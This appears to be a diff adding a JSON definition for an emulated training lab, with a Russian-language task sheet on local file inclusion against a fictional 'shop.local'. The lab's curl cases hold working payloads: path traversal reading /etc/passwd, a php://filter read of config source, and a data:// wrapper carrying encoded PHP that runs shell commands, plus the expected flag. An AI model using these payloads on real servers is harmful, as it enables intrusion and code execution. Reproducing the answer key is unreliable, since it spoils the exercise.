@@ -1,0 +1,22 @@
+{
+  "id": "web-php-wrappers",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{php_f1lt3r_ch41ns_w1n}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: php://filter → чтение исходника\n\nLFI на `https://shop.local/?page=`. Параметр включается через include(),\nпоэтому `?page=config.php` ИСПОЛНИТ файл, а не покажет.\n\n1. Чтение файла: curl -s 'https://shop.local/?page=../../../../etc/passwd' | head -1\n2. Исходник через фильтр (сервер вернёт base64):\n\n   curl -s 'https://shop.local/?page=php://filter/convert.base64-encode/resource=config'\n\n3. Декодируй и найди флаг (в исходнике — пароль):\n\n   curl -s 'https://shop.local/?page=php://filter/convert.base64-encode/resource=config' | base64 -d | grep nto > found.txt\n\n4. Набери `check`.\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local с LFI в ?page=)",
+      "cases": [
+        { "match": "php://filter|convert\\.base64", "example": "-s 'https://shop.local/?page=php://filter/convert.base64-encode/resource=config'", "output": "PD9waHAKLy8gc2hvcC5sb2NhbCBjb25maWcKJGRiX3Bhc3MgPSAibnRve3BocF9mMWx0M3JfY2g0MW5zX3cxbn0iOwo/Pgo=\n" },
+        { "match": "data://|data%3A", "example": "-s 'https://shop.local/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg==&c=id'", "output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n" },
+        { "match": "etc/passwd", "example": "-s 'https://shop.local/?page=../../../../etc/passwd'", "output": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n" },
+        { "match": "page=", "example": "-s 'https://shop.local/?page=home'", "output": "<html><body><h1>shop.local</h1></body></html>\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только LFI-ручка /?page= на shop.local.\n"
+    }
+  }
+}
